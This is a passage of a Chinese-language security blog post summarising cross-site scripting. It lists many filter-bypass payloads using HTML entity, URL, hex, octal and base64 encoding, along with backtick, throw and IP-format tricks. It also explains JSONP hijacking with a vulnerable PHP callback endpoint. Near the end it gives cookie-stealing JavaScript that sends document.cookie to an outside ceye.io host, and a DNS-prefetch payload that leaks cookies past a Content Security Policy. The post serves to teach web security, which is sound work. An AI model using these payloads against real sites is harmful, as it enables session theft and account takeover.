+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;<span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#120;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#41;</span><span class="symbol">&amp;#59;</span>&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>url编码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>Ascii码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>hex</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&#x27;\<span class="attr">x61</span>\<span class="attr">x6c</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x74</span>\<span class="attr">x28</span>\<span class="attr">x27</span>\<span class="attr">x78</span>\<span class="attr">x73</span>\<span class="attr">x73</span>\<span class="attr">x27</span>\<span class="attr">x29</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>八进制</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;\<span class="attr">170</span>\<span class="attr">163</span>\<span class="attr">163</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>base64</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p><strong>内嵌编码后TAB</strong></p>
+</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;jav<span class="symbol">&amp;#x09;</span>ascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>多重尖括号</strong></li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;XSS&quot;</span>);<span class="comment">//&lt;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>使用一些字符绕过”.js”过滤</strong></li>
+</ul>
+<p>将JS文件重命名为图像</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://xss.rooks/xss.jpg&quot;</span>&gt;</span><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="过滤空格-引号"><a href="#过滤空格-引号" class="headerlink" title="过滤空格/引号"></a>过滤空格/引号</h3><ul>
+<li><strong>使用<code>/</code>代替</strong></li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/);</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="过滤单-双引号"><a href="#过滤单-双引号" class="headerlink" title="过滤单/双引号"></a>过滤单/双引号</h3><ul>
+<li><strong>使用反引号代替</strong></li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>`<span class="attr">xss</span>`);&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>编码绕过</strong></li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(&amp;#x27;xss&amp;#x27;);</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="过滤括号"><a href="#过滤括号" class="headerlink" title="过滤括号"></a>过滤括号</h3><ul>
+<li><strong>使用 throw 绕过</strong></li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">onerror=alert;<span class="keyword">throw</span> <span class="number">1337</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>onerror</code>在每次javascript执行异常时都会被激活，调用指定的处理程序，并且<code>throw</code>语句可创建一个发送到<code>onerror</code>处的包含表达式的自定义异常。因为<code>throw</code>是一个语句，在和<code>onerror</code>配合使用时需要用分号隔离，避免被包含。</p>
+<ul>
+<li><strong>使用``` `代替</strong></li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert<span class="string">`1`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>HTML编码绕过</strong></li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">alert<span class="symbol">&amp;#x28;</span>1<span class="symbol">&amp;#x29;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<h3 id="过滤URL地址"><a href="#过滤URL地址" class="headerlink" title="过滤URL地址"></a>过滤URL地址</h3><ul>
+<li><strong>使用URL编码</strong></li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//%<span class="attr">77</span>%<span class="attr">77</span>%<span class="attr">77</span>%<span class="attr">2e</span>%<span class="attr">62</span>%<span class="attr">61</span>%<span class="attr">69</span>%<span class="attr">64</span>%<span class="attr">75</span>%<span class="attr">2e</span>%<span class="attr">63</span>%<span class="attr">6f</span>%<span class="attr">6d</span>/`&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>使用IP</strong></li>
+</ul>
+<p>使用进制转换</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">2130706433</span>/`&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">0177.0.0.01</span>/`&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">0x7f.0x0.0x0.0x1</span>/`&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>html标签中用<code>//</code>可以代替<code>http://</code></strong></li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`//<span class="attr">www.baidu.com</span>`&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>使用<code>\\</code></strong></li>
+</ul>
+<p>但是要注意在windows下\本身就有特殊用途，是一个path 的写法，所以\在Windows下是file协议，在linux下才会是当前域的协议</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`\\<span class="attr">www.baidu.com</span>`&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>使用中文句号代替英文点号</strong></li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;document.location=`http://www。baidu。com`&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>利用data类型的url代替<code>http://</code></strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:text,alert()</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h2 id="XSS高级利用方式"><a href="#XSS高级利用方式" class="headerlink" title="XSS高级利用方式"></a>XSS高级利用方式</h2><h3 id="JSONP劫持"><a href="#JSONP劫持" class="headerlink" title="JSONP劫持"></a>JSONP劫持</h3><p>script标签是可以加载异域的JavaScript并执行的，通过预先设定好的callback函数来实现和非同源页面的交互。它有一个大名，叫做JSONP跨域，JSONP是JSON with Padding的略称。它是一个非官方的协议，明明是加载script，为啥和JSON扯上关系呢？原来就是这个callback函数，对它的使用有一个典型的方式，就是通过JSON来传参，即将JSON数据填充进回调函数，这就是JSONP的JSON+Padding的含义。JSONP只支持GET请求。</p>
+<p>a网站的前端代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">dosomething</span>(<span class="params">jsondata</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//处理获得的json数据</span></span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://haorooms.com/data.php?callback=dosomething&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>b网站的后台代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$callback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];<span class="comment">//得到回调函数名</span></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>);<span class="comment">//要返回的数据</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$callback</span>.<span class="string">&#x27;(&#x27;</span>.json_encode(<span class="variable">$data</span>).<span class="string">&#x27;)&#x27;</span>;<span class="comment">//输出</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>典型的JSON劫持就是通过定义一个跟JSON接口中callback参数值相同的函数来接收JSON接口的数据，它其实就是JSON接口数据加载成功后的callback函数。JSON劫持的产生原因，重点还是在于对调用方没有做判断，或者说他的这种接口地址是固定的或者可猜测的。</p>
+<p>example：</p>
+<p>b网站的JSONP接口为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;haorooms.com&#x2F;data.php?callback&#x3D;dosomething</span><br></pre></td></tr></table></figure>
+<p>在上面的JSONP接口中，dosomething是可以修改的，我们改为<code>&lt;img src=0 onerror=alert(0)&gt;</code>，b网站后端没有对传入的参数进行检查过滤，那么会返回：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;0 onerror&#x3D;alert(0)&gt;&#x2F;&#x2F;[&quot;a&quot;,&quot;b&quot;,&quot;c&quot;]</span><br></pre></td></tr></table></figure>
+<p>一旦如果开发不严谨，没有对Content-Type进行设置或者为text/html或者application/json，可以将内容解析为html的就可能导致XSS的产生。</p>
+<h3 id="DNSLog"><a href="#DNSLog" class="headerlink" title="DNSLog"></a>DNSLog</h3><p>对于没有回显的XSS，我们要想知道是否成功也可以利用<code>src</code>属性填入得到的域名。</p>
+<p>example：</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:81&#x2F;sql.php?input&#x3D;&gt;&lt;img src&#x3D;http:&#x2F;&#x2F;xss.t6n089.ceye.io&#x2F;aaa&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210317151942334.png" alt="image-20210317151942334"></p>
+<h4 id="绕过CSP"><a href="#绕过CSP" class="headerlink" title="绕过CSP"></a>绕过CSP</h4><p>CSP(内容安全策略)是防御XSS最有效的手段之一。当我们发现一个网站有XSS漏洞，想利用XSS平台来打Cookie时，CSP会通过白名单的方式，禁止跨域加载脚本，恶意代码便会因此被阻挡在门外，导致此XSS无法利用。对此，我们可以使用DNS预解析突破CSP的阻拦。</p>
+<p>DNS预解析(DNS Prefetching)是一种能够加快网页加载速度的技术，对于跨站的链接，由于每次都要进行一次DNS解析，会消耗掉很多时间。DNS预解析在浏览器空闲时，将跨站资源的域名转化为IP 地址并缓存，真正请求资源时就避免了解析的时间。有趣的是，DNS预解析是默认开启的，并且我们可以通过<code>rel=&quot;dns-prefetch&quot;</code>来强制进行DNS预解析。<br>由于DNS预解析可以绕过CSP进行解析，结合DNSLOG，我们即可窃取在CSP保护下的Cookie。</p>
+<p>example:</p>
+<p>网站的源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">setcookie(&quot;test&quot;,&quot;test&quot;,time()+3600);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Security-Policy&quot; content&#x3D;&quot;default-src &#39;self&#39;&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;DNSLog_XSS原理重现&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;input&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$xss &#x3D; $_GET[&#39;input&#39;];</span><br><span class="line">echo &#39;你输入的字符为&lt;br&gt;&#39;.$xss;</span><br><span class="line">$myfile &#x3D; fopen(&quot;.&#x2F;set_cookie.js&quot;, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">fwrite($myfile, $xss);</span><br><span class="line">fclose($myfile);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;set_cookie.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<p>这里网站通过<code>&lt;meta&gt;</code>标签设置了CSP为只能加载当前域名的脚本，也就是说无法使用内联的脚本，攻击者需要找到能够注入XSS的JavaScript脚本的外联文件，这里我们可以看到后端把我们输入的值写入了<code>set_cookie.js</code>文件中，然后又通过外联脚本引入了这个文件，这样我们就可以通过这里来进行XSS攻击。</p>
+<p>在没有CSP情况下，我们通常是通过<code>&lt;img&gt;</code>等有src属性的标签带上cookie作为参数去访问我们的服务器：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">img.src = <span class="string">&quot;http://t6n089.ceye.io/log?&quot;</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img);</span><br></pre></td></tr></table></figure>
+<p>由于这里有CSP限制了不能读取外部的资源，因此这里会报错。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210318163246373.png" alt="image-20210318163246373"></p>
+<p>这里我们就可以使用DNS预解析去进行绕过：</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?input&#x3D;document.querySelector(&#39;body&#39;).innerHTML&#x3D;&quot;&lt;link rel&#x3D;&#39;dns-prefetch&#39; href&#x3D;&#39;http:&#x2F;&#x2F;&quot;+document.cookie.split(&#x2F;;|&#x3D;&#x2F;)[0].trim()+&quot;.t6n089.ceye.io&#39;&gt;&quot;;</span><br></pre></td></tr></table></figure>
+<p>URL编码后：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?input&#x3D;document.querySelector(&#39;body&#39;).innerHTML%3D%22%3Clink%20rel%3D&#39;dns-prefetch&#39;%20href%3D&#39;http%3A%2F%2F%22%2Bdocument.cookie.split(%2F%3B%7C%3D%2F)%5B0%5D.trim()%2B%22.t6n089.ceye.io&#39;%3E%22%3B</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210318163559401.png" alt="image-20210318163559401"></p>
+<p>这种利用方法十分苛刻，因为不仅要找到能够修改后台的外联JavaScript文件的方法，而且作为XSS攻击，此payload过长，容易被怀疑，而使用短链接加载外部脚本有会被CSP禁止，再加上根据DNS的规定，域名的长度是有限制的，有时可能不发将长cookie完全带出。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.fooying.com/the-art-of-xss-1-introduction/#" >跨站的艺术-XSS入门与介绍<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/01/xss.html" >XSS从零开始<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/index.html" > Web安全学习笔记<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/u010648555/article/details/108351169" >XSS(跨站脚本攻击)相关内容总结整理<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4067#toc-4" >XSS总结<i class="fas fa-external-link-alt"></i></a></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：XSS总结</li>
+        <li>Post author：John_Frod</li>
+        <li>Create time：2021-03-24 16:35:47</li>
+        <li>
+            Post link：https://keep.xpoet.cn/2021/03/24/XSS总结/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2021/03/24/CSP%E7%AD%96%E7%95%A5%E4%B8%8E%E7%BB%95%E8%BF%87/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">CSP策略与绕过</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center" >
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                    
+                </main>
+
+            </div>
+
+            <div class="page-main-content-bottom">
+                <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span> -
+            
+            2021 <i class="fas fa-heart icon-animate"></i> <a href="/">John_Frod</a>
+        </div>
+        
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count <span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a> | Theme <a class="theme-version" target="_blank"></a>
+        </div>
+    </div>
+</footer>
+
+            </div>
+        </div>
+    </main>
+
+    <div class="sidebar-tools">
+        <div class="tools-container">
+    <ul class="tools-list">
+        
+            <li class="search popup-trigger">
+                <i class="fas fa-search"></i>
+            </li>
+        
+
+        
+
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+    </ul>
+</div>
+
+    </div>
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        <li class="tools-item tool-scroll-to-top flex-center">
+            <i class="fas fa-arrow-up"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="tools-ul-1">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+    </ul>
+</div>
+
+    </div>
+
+    <!-- page aside -->
+    <aside class="page-aside">
+        
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS%E6%80%BB%E7%BB%93"><span class="nav-text">XSS总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-text">简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%B1%E5%AE%B3"><span class="nav-text">危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-text">原理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="nav-text">反射型XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="nav-text">存储型XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOM%E5%9E%8BXSS"><span class="nav-text">DOM型XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS%E5%B8%B8%E7%94%A8%E6%A0%87%E7%AD%BE"><span class="nav-text">XSS常用标签</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#script"><span class="nav-text">script</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#img"><span class="nav-text">img</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#input"><span class="nav-text">input</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#details"><span class="nav-text">details</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#svg"><span class="nav-text">svg</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#select"><span class="nav-text">select</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#iframe"><span class="nav-text">iframe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#video-audio"><span class="nav-text">video&#x2F;audio</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#a"><span class="nav-text">a</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#form"><span class="nav-text">form</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS%E5%B8%B8%E8%A7%81%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F"><span class="nav-text">XSS常见注入方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HTML%E6%97%A0%E6%B3%95%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC%E7%9A%84%E6%A0%87%E7%AD%BE"><span 